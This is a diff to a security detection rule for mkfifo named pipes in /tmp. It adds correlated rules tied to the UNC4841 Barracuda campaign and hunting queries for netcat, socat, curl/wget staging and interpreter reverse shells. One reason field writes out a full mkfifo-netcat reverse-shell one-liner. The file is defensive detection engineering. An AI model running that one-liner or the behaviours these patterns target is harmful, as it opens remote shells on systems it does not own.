@@ -136,23 +136,58 @@ graylog:
   query: data_process_exec_process_binary:/.*\/[Mm][Kk][Ff][Ii][Ff][Oo]/ AND data_process_exec_process_arguments:/.* \/[Tt][Mm][Pp]\/.*/
 
 correlation:
-  # Authored by the correlation engine for review.
+  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
+  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
+  related_rules:
+  - id: 60911c07-f989-4362-84af-c609828ef829
+    name: UNC4841 - SSL Certificate Exfiltration Via Openssl
+    reason: Its own description says openssl was used by UNC4841 'as a C2 channel with named pipes' - the openssl-backpipe twin of this mkfifo FIFO, and UNC4841 is the exact Barracuda ESG campaign (CVE-2023-2868) cited in this rule's references. openssl s_client bridging the pipe to C2 is the strongest co-occurring confirmation.
+  - id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
+    name: Potential Netcat Reverse Shell Execution
+    reason: Netcat is the canonical network leg paired with a mkfifo backpipe (mkfifo /tmp/f; cat /tmp/f | /bin/sh | nc host port > /tmp/f). A netcat exec on the same host within minutes is the other half of this reverse shell - the FIFO exists precisely to bridge nc's stdin/stdout to a shell when nc lacks -e.
+  - id: 880973f3-9708-491c-a77b-2a35a1921158
+    name: Linux Shell Pipe to Shell
+    reason: The backpipe one-liner pipes the FIFO read into an interactive shell (cat /tmp/f | /bin/sh -i), which is literally a shell-pipe-to-shell. This rule fires on the same wrapper command line that assembles the mkfifo reverse shell.
+  - id: f6a711f3-d032-4f9e-890b-bbe776236c84
+    name: UNC4841 - Potential SEASPY Execution
+    reason: SEASPY is the backdoor UNC4841 deployed in the same Barracuda ESG intrusions (this rule's reference) where mkfifo/openssl named-pipe backpipes were used for C2. A SEASPY binary exec on the host is a campaign-matched co-indicator of the same actor and intrusion.
+  - id: 818f7b24-0fba-4c49-a073-8b755573b9c7
+    name: Linux Webshell Indicators
+    reason: A web-server child spawning a shell is the dominant initial-access precursor that drops a mkfifo backpipe - the exploited service (nginx/apache/php-fpm) is often the grandparent of the mkfifo exec. Confirms how the attacker got code execution to run mkfifo.
+  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+    name: Suspicious Download and Execute Pattern via Curl/Wget
+    reason: Attackers stage a payload or stager into /tmp or /dev/shm via curl/wget immediately before building the backpipe. A download-and-execute into the same /tmp where the FIFO is created is the precursor staging step of this foothold.
+  - id: 2fade0b6-7423-4835-9d4f-335b39b83867
+    name: Shell Execution Of Process Located In Tmp Directory
+    reason: The FIFO and the dropped payload both live in /tmp; a shell whose parent process sits in /tmp is the co-located signal of the same /tmp-based foothold that created the named pipe, tying the mkfifo event to a /tmp-resident implant.
+  - id: 0cf7a157-8879-41a2-8f55-388dd23746b7
+    name: Linux Recon Indicators
+    reason: Once the backpipe lands an interactive shell, the first attacker actions are host/network reconnaissance (whoami/id/uname/ip/ss). Recon on the same host after the mkfifo expands a single pipe-creation event into a confirmed hands-on-keyboard incident.
+  window: 1h
   enrichment_searches:
-  # Rule-specific telemetry pivots the engine runs around an alert from this rule,
-  # scoped to the alert's host/user/IP within the window (behaviour-targeted, not a sweep).
-    - name: "Other executions of this tool-set on this host (any arguments)"
-      query: 'data_process_exec_process_binary:/.*(\/[Mm][Kk][Ff][Ii][Ff][Oo])/'
-      pivot_on: [host]
-      window: 2h
-    - name: "Persistence via cron / systemd / shell profiles on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]|\/[Ss][Yy][Ss][Tt][Ee][Mm][Cc][Tt][Ll]|\/[Aa][Tt]|\/[Uu][Pp][Dd][Aa][Tt][Ee]-[Rr][Cc]\.[Dd])/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Yy][Ss][Tt][Ee][Mm][Dd].*/) OR (data_process_exec_process_arguments:/.*[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh][Rr][Cc].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh]_[Pp][Rr][Oo][Ff][Ii][Ll][Ee].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Pp][Rr][Oo][Ff][Ii][Ll][Ee].*/) OR (data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ii][Nn][Ii][Tt]\.[Dd].*/))'
-      pivot_on: [host]
-      window: 4h
-    - name: "Shell / interpreter execution on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh]|\/[Bb][Uu][Ss][Yy][Bb][Oo][Xx])/) OR (data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee]|\/[Ll][Uu][Aa]|\/[Aa][Ww][Kk])/))'
-      pivot_on: [host]
-      window: 1h
-    - name: "Reconnaissance commands on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee][Cc][Tt][Ll]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp]|\/[Ww]|\/[Ww][Hh][Oo]|\/[Ll][Aa][Ss][Tt]|\/[Ll][Ss][Oo][Ff]|\/[Nn][Mm][Aa][Pp]|\/[Dd][Ii][Gg]|\/[Ff][Ii][Nn][Dd])/'
-      pivot_on: [host]
-      window: 1h
+  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
+  - name: Reverse-shell network leg (netcat/socat/telnet) bridging the pipe
+    query: (data_process_exec_process_binary:/.*(\/[Nn][Cc]|\/[Nn][Cc][Aa][Tt]|\/[Nn][Ee][Tt][Cc][Aa][Tt]|\/[Ss][Oo][Cc][Aa][Tt]|\/[Tt][Ee][Ll][Nn][Ee][Tt])/)
+    pivot_on:
+    - host
+    window: 1h
+  - name: 'FIFO consumer: interactive shell or cat/tail reading the /tmp pipe'
+    query: ((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh])/ AND data_process_exec_process_arguments:/.*-[A-Za-z]*[Ii].*/) OR (data_process_exec_process_binary:/.*(\/[Cc][Aa][Tt]|\/[Tt][Aa][Cc]|\/[Tt][Aa][Ii][Ll])/ AND data_process_exec_process_arguments:/.* ?\/[Tt][Mm][Pp]\/.*/))
+    pivot_on:
+    - host
+    window: 1h
+  - name: 'Payload staging: download into /tmp or /dev/shm then make executable'
+    query: ((data_process_exec_process_binary:/.*(\/[Ww][Gg][Ee][Tt]|\/[Cc][Uu][Rr][Ll]|\/[Tt][Ff][Tt][Pp]|\/[Ff][Ee][Tt][Cc][Hh])/) OR (data_process_exec_process_binary:/.*\/[Cc][Hh][Mm][Oo][Dd]/ AND data_process_exec_process_arguments:/.*(\/[Tt][Mm][Pp]\/|\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/).*/))
+    pivot_on:
+    - host
+    window: 2h
+  - name: Alternative interpreter reverse shell (python/perl/ruby/php/node socket or shell spawn)
+    query: ((data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn][0-9.]*|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee])/) AND (data_process_exec_process_arguments:/.*([Ss][Oo][Cc][Kk][Ee][Tt]|[Pp][Tt][Yy]|[Ss][Pp][Aa][Ww][Nn]|[Cc][Oo][Nn][Nn][Ee][Cc][Tt]).*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/([Bb][Aa][Ss][Hh]|[Ss][Hh]).*/))
+    pivot_on:
+    - host
+    window: 1h
+  - name: Post-foothold reconnaissance on the host (identity and network discovery)
+    query: data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Ii][Pp]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp])/
+    pivot_on:
+    - host
+    window: 1h
